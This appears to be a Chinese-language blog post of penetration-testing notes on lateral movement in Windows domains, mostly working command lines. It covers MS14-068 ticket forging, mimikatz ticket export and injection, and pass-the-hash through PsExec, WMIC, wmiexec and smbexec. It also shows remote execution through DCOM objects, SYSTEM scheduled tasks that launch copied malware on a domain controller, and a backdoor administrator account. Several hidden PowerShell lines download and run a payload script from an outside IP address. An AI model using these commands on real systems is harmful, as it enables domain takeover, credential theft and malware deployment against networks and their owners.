+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\dc.xxx.com</span><br><span class="line"><span class="built_in">copy</span> C:\xxx\xxx.com \\dc.xxx.com\C$</span><br><span class="line">shell schtasks /create /s dc.xxx.com /tn test /sc onstart /tr c:\wanli.exe /ru system /f </span><br><span class="line">shell schtasks /run /s dc.xxx.com /i /tn <span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="用CS"><a href="#用CS" class="headerlink" title="用CS"></a>用CS</h4><p>直接用就行</p>
+<p>把ntlm hash 和sid传进去就行</p>
+<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>非常牛，不需要再去找到域管理的NTLM Hash、ase256值之类的，直接将普通用户变成域管</p>
+<p>原理：</p>
+<p>在server2000以上的域控服务器中，通过伪造域管的TGT将普通用户权限提升为域管权限，以此来控制域控。只要服务器没有打漏洞ms14-068的补丁(KB3011780)，都可以进行利用</p>
+<p>MS14-068利用条件</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取域普通用户账号密码</span><br><span class="line">获取域普通用户的sid</span><br><span class="line">服务器未打补丁</span><br></pre></td></tr></table></figure>
+
+<p>环境windows server2008</p>
+<p>查看域用户的SID</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>
+
+<p>清除内存中的票据</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure>
+
+<p>生成凭证</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ms14<span class="number">-068.</span>exe -u 域用户@域名 -p 域用户密码 -s 域用户SID -d 域控</span><br></pre></td></tr></table></figure>
+
+<p>导入票据</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc 票据名字</span><br></pre></td></tr></table></figure>
+
+<p>执行命令</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc.xxx.com\C$  <span class="comment">//不能用ip，得用机器名</span></span><br></pre></td></tr></table></figure>
+
+<p>建立网络连接</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\dc.xxx.com</span><br></pre></td></tr></table></figure>
+
+<p>复制恶意文件</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> xxx.exe \\dc.xxx.com</span><br></pre></td></tr></table></figure>
+
+<p>添加计划任务</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s dc.xxx.com /tn test /sc onstart /tr xxx.exe /ru system /f </span><br></pre></td></tr></table></figure>
+
+<p>启动计划任务</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s dc.xxx.com /i /tn <span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>即可上线</p>
+<h3 id="goldenPac-exe"><a href="#goldenPac-exe" class="headerlink" title="goldenPac.exe"></a>goldenPac.exe</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goldenPac.exe 域名/域用户名:域用户明文密码@域控完整域名</span><br></pre></td></tr></table></figure>
+
+<p> 票据传递一键利用工具</p>
+<h3 id="PsExec工具远程命令执行横向移动-老了，被杀软盯死了，而且日志太多"><a href="#PsExec工具远程命令执行横向移动-老了，被杀软盯死了，而且日志太多" class="headerlink" title="PsExec工具远程命令执行横向移动(老了，被杀软盯死了，而且日志太多)"></a>PsExec工具远程命令执行横向移动(老了，被杀软盯死了，而且日志太多)</h3><p>PsExec介绍</p>
+<p>是windows下非常好的一款远程命令行工具。类似于RDP的平替。psexec的使用不需要对方开放3389，只需要对方开启了admin和IPC(默认开启)，比如我电脑上</p>
+<p><img src="/./../image/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1729157028307-5.png" alt="img"></p>
+<p>还需要开启了445端口。如果防火墙关闭了445端口，则会提示网络路径找不着。由于psexec是windows自带的工具，所以杀软将其放在白名单中</p>
+<p>下载地址<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
+<p>PsExec使用条件</p>
+<p>1.具有正确的凭证(内存凭证、账号密码、账号NTLM Hash)</p>
+<p>2.能建立IPC链接(也就是需要通过smb认证)，并且目标机器开启了共享(默认开启)，并且目标中必须要有admin$共享</p>
+<p>PsExec常用参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">psexec \\ip -u administrator -p admin cmd 进入半交互式shell</span><br><span class="line">psexec -accepteula \\192.168.108.101 -u administrator -p admin -s cmd.exe 建立交互的shell</span><br><span class="line">psexec \\ip -u administrator -p admin -w c:\cmd 进入交互式shell，且c:\是目标机器工作目录</span><br><span class="line">psexec \\ip -u administrator -p admin whoami all 执行命令</span><br><span class="line">psexec \\ip -u administrator -p admin -d c:\beacon.exe 执行命令</span><br><span class="line">psexec \\ip -u administrator -p admin -h -d c:\beacon.exe UAC的用户权限执行文件</span><br></pre></td></tr></table></figure>
+
+<p>返回交互式的shell或者执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\192.168.41.150 -s cmd.exe 返回交互shell(必须是msf或者远程到桌面CS)</span><br><span class="line">psexec.exe -accepteula \\192.168.41.150 -s ipconfig 远程执行命令</span><br></pre></td></tr></table></figure>
+
+<p>net use \192.168.41.20\c$ admin@123 &#x2F;user:administor</p>
+<p>建立IPC链接，就能在后续的操作中不再输入账号密码</p>
+<p>删除建立的ipc链接</p>
+<p>Net use * &#x2F;del &#x2F;y</p>
+<p>通过这种方式能传票据获取到访问权限，然后通过copy命令进行传木马，然后再在这里进行执行。</p>
+<p>或者直接用CS里面集成好的就行</p>
+<p>或者说使用票据传递</p>
+<p>导出票据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;</span><br></pre></td></tr></table></figure>
+
+<p>清除票据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br><span class="line">mimikatz kerberos::purge</span><br></pre></td></tr></table></figure>
+
+<p> 票据注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt [<span class="number">0</span>;<span class="number">998</span>d7]<span class="operator">-</span>x<span class="operator">-</span>x<span class="operator">-</span>xxxxxx<span class="operator">-</span>Administrator<span class="variable">@krbtht</span><span class="operator">-</span>HACK.COMkirbi</span><br></pre></td></tr></table></figure>
+
+<p>查看是否有票</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br><span class="line">dir \\xx.xxx.xxx\c$</span><br></pre></td></tr></table></figure>
+
+<p>上传文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">copy</span> C:\xxx\xxx\desktop\xxxx.exe \\dc.xxx.xxx\C$</span><br></pre></td></tr></table></figure>
+
+<p>运行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe <span class="operator">-</span>accepteula  \\dc.xxx.com <span class="operator">-</span>h <span class="operator">-</span>d C:\xxxx.exe</span><br></pre></td></tr></table></figure>
+
+<p>如果有账号密码直接IPC链接</p>
+<p>如果有凭证就pth</p>
+<p>如果有票据就ptt</p>
+<h3 id="WMIC远程执行命令横向移动-无日志，极好用"><a href="#WMIC远程执行命令横向移动-无日志，极好用" class="headerlink" title="WMIC远程执行命令横向移动(无日志，极好用)"></a>WMIC远程执行命令横向移动(无日志，极好用)</h3><p>WMI是在powershell没发布前，微软用来管理windows系统的数据库工具。wmi本身是数据库架构，使用dcom或者winrm协议，自从psexec在内网中被严格监控后，更多使用wmiexec进行横向，windows系统默认不会讲wmi操作记录在日志中,又转换成使用wmic</p>
+<p>wmic拓展wmi(windows management instrumentation，windows管理规范)，即wmic.exe,提供了命令行接口和批处理脚本执行系统管理的支持，</p>
+<p>但是啊但是，wmic只有本地管理员或者域管才能正常使用，如果普通权限用户想用wmi，需要修改普通用户的acl，不过修改用户的acl也需要管理员权限，普通用户使用wmic。以下命令均在2008R2、2012R2、2016上进行测试，部分命令在虚拟机中测试不行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">wmic logon list brief 登录用户</span><br><span class="line">wmic ntdomain list brief 域控机器</span><br><span class="line">wmic useraccount list brief 用户列表</span><br><span class="line">wmic share <span class="keyword">get</span> name,path 查看系统共享</span><br><span class="line">wmic service list brief <span class="operator">|</span> more 服务列表</span><br><span class="line">wmic startup list <span class="keyword">full</span> 识别开机启动的程序，包括路径</span><br><span class="line">wmic fsdir &quot;c:\\test&quot; <span class="keyword">call</span> <span class="keyword">delete</span> 删除c盘下的test目录</span><br><span class="line">wmic nteventlog <span class="keyword">get</span> path,filename,writeable 查看系统中开启的日志</span><br><span class="line">wmic qfe <span class="keyword">get</span> description,installedOn 使用wmic识别系统中补丁的情况</span><br><span class="line">wmic qfe <span class="keyword">get</span> Caption,Description,HotFixID,InstalledOn 列出系统中所有补丁具体情况</span><br><span class="line">wmic product <span class="keyword">get</span> name,version 查看系统中安装的软件以及版本</span><br><span class="line">wmic useraccount <span class="keyword">where</span> &quot;name=%UserName%&quot; <span class="keyword">call</span> rename newUserName 更改当前用户名</span><br><span class="line">wmic useraccount <span class="keyword">where</span> &quot;name=Administrator&quot; <span class="keyword">call</span> Rename admin 更改指定用户名</span><br><span class="line">wmic bios list <span class="keyword">full</span> <span class="operator">|</span> findstr <span class="operator">/</span>i &quot;vmware&quot; 查看当前系统是否为vmware</span><br><span class="line">wmic desktop <span class="keyword">get</span> screens Acer secure,screensavertimeout 查看当前是否有屏保，延迟多少</span><br><span class="line">wmic process <span class="keyword">where</span> name<span class="operator">=</span>&quot;vmtoolsd.exe&quot; fet executablepath 获取指定进程的可执行文件路径，比如这里vmtools</span><br><span class="line">wmic environment <span class="keyword">where</span> &quot;name=&#x27;temp&#x27;&quot; <span class="keyword">get</span> UserName,VariableValue 获取环境变量</span><br><span class="line">查询本机磁盘</span><br><span class="line">wmic logicaldisk llist brief</span><br><span class="line">wmic logicaldisk <span class="keyword">get</span> description,name,size,freespace <span class="operator">/</span><span class="keyword">value</span></span><br><span class="line">卸载和重装安装程序</span><br><span class="line">wmic product <span class="keyword">where</span> &quot;name like &#x27;%office%&#x27;&quot; <span class="keyword">get</span> name</span><br><span class="line">wmic product <span class="keyword">where</span> name<span class="operator">=</span>&quot;office&quot; <span class="keyword">call</span> uninstall</span><br><span class="line">查看某个进程的详细信息(路径，命令行参数)</span><br><span class="line">wmic process <span class="keyword">where</span> name<span class="operator">=</span>&quot;wps.exe&quot; list <span class="keyword">full</span></span><br><span class="line">wmic process <span class="keyword">where</span> name<span class="operator">=</span>&quot;wps.exe&quot; <span class="keyword">get</span> executablepath,name,ProcessId 进程路径</span><br><span class="line">更改path环境变量值，新增c:\whoami</span><br><span class="line">wmic environment <span class="keyword">where</span> &quot;name=&#x27;path&#x27; and usernmae=&#x27;&lt;system&gt;&#x27;&quot; <span class="keyword">set</span> VariableValue<span class="operator">=</span>&quot;%path%;c:\whoami&quot;</span><br><span class="line">查看某个进程的详细信息<span class="operator">-</span>PID</span><br><span class="line">wmic process llist brief</span><br><span class="line">tasklist <span class="operator">/</span>SVC <span class="operator">|</span> findstr frp.exe</span><br><span class="line">wmic process <span class="keyword">where</span> ProcessId<span class="operator">=</span><span class="number">123</span> list <span class="keyword">full</span></span><br><span class="line">wmic process <span class="keyword">where</span> name <span class="operator">=</span>&quot;xxx.exe&quot; <span class="keyword">call</span> terminate</span><br><span class="line">ntsd <span class="operator">-</span>c q <span class="operator">-</span>p PID</span><br><span class="line">获取电脑产品编号和型号</span><br><span class="line">wmic baseboard <span class="keyword">get</span> Product,Serialnumber</span><br><span class="line">wmic bios <span class="keyword">get</span> serialnumber</span><br><span class="line">安装软件</span><br><span class="line">wmic product <span class="keyword">get</span> name,version</span><br><span class="line">wmic product list brief</span><br></pre></td></tr></table></figure>
+
+<p>错误代码含义以及解决方法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x800706ba</span>  RPC服务器不可用  开启防火墙，允许共享例外</span><br><span class="line"><span class="number">0x80070005</span>  拒绝访问    组策略允许administraotr远程访问</span><br><span class="line"><span class="number">0x800706ba</span>  RPC服务器不可用  IP安全策略阻止<span class="number">135</span></span><br><span class="line"><span class="number">0x80070422</span> 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动   启用winmgmt服务</span><br><span class="line">拒绝wbem(Web<span class="operator">-</span>Based Enterprise Management)目录权限，无法使用wmic</span><br></pre></td></tr></table></figure>
+
+<p>wmic调用cmd</p>
+<p>需要管理员权限</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">执行命令并且输出</span><br><span class="line">wmic <span class="operator">/</span>node:IP地址 <span class="operator">/</span><span class="keyword">user</span>:本地用户管理员<span class="operator">/</span>域管理员 <span class="operator">/</span>password:密码 process <span class="keyword">call</span> <span class="keyword">create</span> &quot;cmd.exe /c ipconfig &gt; C:\ip.txt&quot;</span><br><span class="line">列出远程主机进程</span><br><span class="line">wmic  <span class="operator">/</span>node:IP地址 <span class="operator">/</span><span class="keyword">user</span>:本地用户管理员<span class="operator">/</span>域管理员 <span class="operator">/</span>password:密码 process list brief</span><br><span class="line">在远程系统上执行bat脚本</span><br><span class="line">wmic <span class="operator">/</span>node:IP地址 <span class="operator">/</span><span class="keyword">user</span>:本地用户管理员<span class="operator">/</span>域管理员 <span class="operator">/</span>password:密码 process <span class="keyword">call</span> <span class="keyword">create</span> c:\process.bat</span><br><span class="line">wmic <span class="operator">/</span>node:IP地址 <span class="operator">/</span><span class="keyword">user</span>:本地用户管理员<span class="operator">/</span>域管理员 <span class="operator">/</span>password:密码 process <span class="keyword">call</span> <span class="keyword">create</span> &quot;cmd.exe /c net user test1 !@123we /add &amp;&amp; net localgroup administrators test1 /add&quot;</span><br><span class="line">执行powershell上线</span><br><span class="line">wmic <span class="operator">/</span>node:IP <span class="operator">/</span><span class="keyword">user</span>:本地用户管理员<span class="operator">/</span>域管理员 <span class="operator">/</span>password:密码 PROCESS <span class="keyword">call</span> <span class="keyword">create</span> &quot;powershell.exe -nop -w hidden -c \ &quot;IEX ((<span class="keyword">new</span><span class="operator">-</span>object net.webclient).downloadstring(<span class="string">&#x27;ps脚本地址&#x27;</span>))\&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>利用powershell上线</p>
+<p>利用cs生成powershell脚本，到服务器，然后用上面最后一句运行即可</p>
+<h3 id="wmiexec工具（会被windows-defender挡）"><a href="#wmiexec工具（会被windows-defender挡）" class="headerlink" title="wmiexec工具（会被windows defender挡）"></a>wmiexec工具（会被windows defender挡）</h3><p> wmiexec是一个由全交互和半交互的远程命令执行工具，由python版本的pe版本可运行多种环境，包括webshell环境，rdp环境、socks环境等。和wmic一样的，优点是不写入磁盘，不留下系统日志，但是啊但是会有很多网络流量传递</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe 域名<span class="operator">/</span>用户名：密码@目标IP #哈希传递获得shell</span><br><span class="line">wmiexec.exe 域名<span class="operator">/</span>用户名：密码@目标IP &quot;ipconfigb&quot; #执行命令</span><br><span class="line">wmiexec.exe <span class="operator">-</span>hashes LM Hash:NT Hash 域名<span class="operator">/</span>用户名@目标IP #哈希传递获得shell(从cs上能看LMhash和NThash)</span><br><span class="line">wmiexec.exe <span class="operator">-</span>hashes LM Hash:NT Hash 域名<span class="operator">/</span>用户名@目标IP ”ipconfig“ #执行命令</span><br></pre></td></tr></table></figure>
+
+<p>wmiexec.vbs</p>
+<p>脚本调用wmi来模拟PsExec的功能，在远程中执行命令并进行回显，获取远程主机的半交互式的shell，wmiexec.vbs支持半交互shell模式，另一种是执行单条命令模式</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe <span class="operator">/</span><span class="operator">/</span>nologo wmiexec.vbs <span class="operator">/</span>cmd IP 用户 密码 &quot;命令&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Invoke-WMIExec</p>
+<p>是一个powershell脚本在invoke-TheHash的文件中用法如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke<span class="operator">-</span>WMIExec <span class="operator">-</span>Target IP <span class="operator">-</span>Domain 域 <span class="operator">-</span>Username 用户 <span class="operator">-</span>Hash hash<span class="operator">-</span>Command &quot;calc.exe&quot; <span class="operator">-</span>verbose</span><br></pre></td></tr></table></figure>
+
+<p>采用无文件落地方式进行横向</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell <span class="operator">-</span><span class="keyword">exec</span> bypass <span class="operator">-</span>c IEX (<span class="keyword">New</span><span class="operator">-</span>Object System.Net.Webclient).DownloadString(<span class="string">&#x27;xxxxxx&#x27;</span>);import<span class="operator">-</span><span class="keyword">module</span> .\Invoke<span class="operator">-</span>WMIExec.ps1;Invoke<span class="operator">-</span>WMIExec <span class="operator">-</span>Target xxx.xxx.xxx.xxx <span class="number">0</span>Username administrator <span class="operator">-</span>Hash xxxxxxxxxxxxxxxxxxxxx <span class="operator">-</span>Command &quot;whoami&quot; <span class="operator">-</span>verbose</span><br></pre></td></tr></table></figure>
+
+<p>本地执行</p>
+<p>导入脚本</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell<span class="operator">-</span>import powershell<span class="operator">/</span>Invoke<span class="operator">-</span>WMIExec.ps1</span><br></pre></td></tr></table></figure>
+
+<p>运行上线命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Invoke<span class="operator">-</span>WMIExec <span class="operator">-</span>Target xxx.xxx.xxx.xxx <span class="operator">-</span>Username administrator <span class="operator">-</span>Hash xxxxxxxxxxxxxxxxx <span class="operator">-</span>Command &quot;powershell.exe -nop -w hidden -c IEX ((new-objectnet.webclient).downloadstring(&#x27;xxxxxx&#x27;))&quot; <span class="operator">-</span>verbose</span><br></pre></td></tr></table></figure>
+
+<p>Invoke-WMIMethod.ps1</p>
+<p>为powershell的内置模块，可以使用自由组合的命令进行测试</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">User</span> #目标系统用户名 </span><br><span class="line">$Password #目标系统密码 </span><br><span class="line">$Cred #账号密码整合，导入Credential </span><br><span class="line">Invoke<span class="operator">-</span>WMIMethod #远程运行指定程序 </span><br><span class="line">#####<span class="comment">---------------------------##### </span></span><br><span class="line">$<span class="keyword">User</span> <span class="operator">=</span> &quot;administrator&quot; </span><br><span class="line">$Password<span class="operator">=</span> ConvertTo<span class="operator">-</span>SecureString <span class="operator">-</span>String &quot;Admin@123&quot; <span class="operator">-</span>AsPlainText <span class="operator">-</span>Force </span><br><span class="line">$Cred <span class="operator">=</span> <span class="keyword">New</span><span class="operator">-</span>Object <span class="operator">-</span>TypeName System.Management.Automation.PSCredential <span class="operator">-</span> </span><br><span class="line">ArgumentList $<span class="keyword">User</span> , $Password </span><br><span class="line">Invoke<span class="operator">-</span>WMIMethod <span class="operator">-</span>Class Win32_Process <span class="operator">-</span>Name <span class="keyword">Create</span> <span class="operator">-</span>ArgumentList &quot;powershell.exe </span><br><span class="line">-nop -w hidden -c IEX ((new-object </span><br><span class="line">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot; <span class="operator">-</span> </span><br><span class="line">ComputerName &quot;192.168.41.20&quot; <span class="operator">-</span>Credential $Cred</span><br></pre></td></tr></table></figure>
+
+<h3 id="SMB远程代码执行（不能在cs里面用，得拿到机器才能用）"><a href="#SMB远程代码执行（不能在cs里面用，得拿到机器才能用）" class="headerlink" title="SMB远程代码执行（不能在cs里面用，得拿到机器才能用）"></a>SMB远程代码执行（不能在cs里面用，得拿到机器才能用）</h3><p>smbexec使用</p>
+<p>smbexec是impacket工具中的工具，操作简单，容易被杀，使用无需先进行ipc链接</p>
+<p>由于它在域控制里面经常用到，所以一般来说不会被禁用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec <span class="operator">-</span>hashes :$HASH$ .<span class="operator">/</span>admin<span class="variable">@xxx</span>.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
+
+<h3 id="DCOM远程命令横向移动"><a href="#DCOM远程命令横向移动" class="headerlink" title="DCOM远程命令横向移动"></a>DCOM远程命令横向移动</h3><p>DCOM介绍</p>
+<p>DCOM是微软的一系列概念和程序接口，支持不同机器上的组件间相互通信，不论是运行在局域网、广域网、还是internet上，利用这个接口，客户端对象能向网络中另一台积极去上的服务器程序对象发送请求，使用</p>
+<p>域管的administrator账户或者目标主机具有主机的管理员账户</p>
+<p>windows自带</p>
+<p>通过powershell与dcom进行远程交互，另外我们需要提供一个dcom progid和一个ip地址，然后就能远程返回一个com对象的实例</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$com<span class="operator">=</span>[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;11.111.111.111&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>执行命令，能调用executeshellcommand方法在远程主机上启动进程</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$com.Document.ActiveView.ExecuteShellCommand(<span class="string">&#x27;cmd.exe&#x27;</span>,$<span class="keyword">null</span>,&quot;/c shell.exe&quot;,&quot;Minimzed&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>将ip和命令更换即可</p>
+<p>shellwindows远程命令执行</p>
+<p>这里的值是COM 对象的类标识符，这个值是通过查找和CLSID关联代码并创建类对象获取的</p>
+<p>相关文章:<a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/48767">https://www.exploit-db.com/docs/48767</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Activator]::CreateInstance([Type]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,&quot;127.0.0.1&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:windowssystem32&quot;,$<span class="keyword">null</span>,<span class="number">0</span>) 打开本地计算器</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1729157028307-6.png" alt="img"></p>
+<p>Shellbrowserwindow</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.41.147&quot;)).Document.Application.shellExecute(&quot;cmd.exe&quot;,&quot;/c powershell.exe -nop -w hidden -c IEX ((new-objectnet.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;,&quot;c:windowssystem32&quot;,$<span class="keyword">null</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Excel.Application</p>
+<p>装有excle</p>
+<p>通过powershell与dcom进行远程交互，创建excel.application对象的实例</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$com <span class="operator">=</span> </span><br><span class="line">[activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;192.1 </span><br><span class="line">68.41.147&quot;)) </span><br><span class="line">$com.DisplayAlerts <span class="operator">=</span> $<span class="literal">false</span> </span><br><span class="line">$com <span class="operator">=</span> </span><br><span class="line">[activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;127.0 </span><br><span class="line">.0.1&quot;)) </span><br></pre></td></tr></table></figure>
+
+<p>执行后面的命令，调用执行该对象在”DDElnitiate”方法在远程主机上启动进程</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$com.DDEInitiate(&quot;cmd.exe&quot;,&quot;/c 参数&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>Visio.Application远程代码执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.168.52.138&quot;)).[<span class="number">0</span>].Document.Application.shellExecute(&quot;C:shell.exe&quot;) </span><br></pre></td></tr></table></figure>
+
+<p>Outlook.Application远程</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192.168.52.138&quot;)).createObject(&quot;Shell.Application&quot;).shellExecute(&quot;C:shell.exe&quot;) </span><br></pre></td></tr></table></figure>
+
+<h3 id="WinRM远程执行命令"><a href="#WinRM远程执行命令" class="headerlink" title="WinRM远程执行命令"></a>WinRM远程执行命令</h3><p>WinRM(windows远程管理)是microsoft在windows中对ws-management的实现，将通用网络访问或交换管理信息。利用脚本或内置的命令行工具，winrm可以与可能具有基板管理控制器(BMC)的任何远程计算机一起使用，以获取数据。也可以获取基于windows的计算机(包括winrm)</p>
+<p>winrm默认端口为5985或5986，若配置了winrm远程，当我们拿到管理员账号，可以用远程连接进行命令执行操作</p>
+<p>配置winrm，可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_23663693/article/details/121654390">https://blog.csdn.net/qq_23663693/article/details/121654390</a></p>
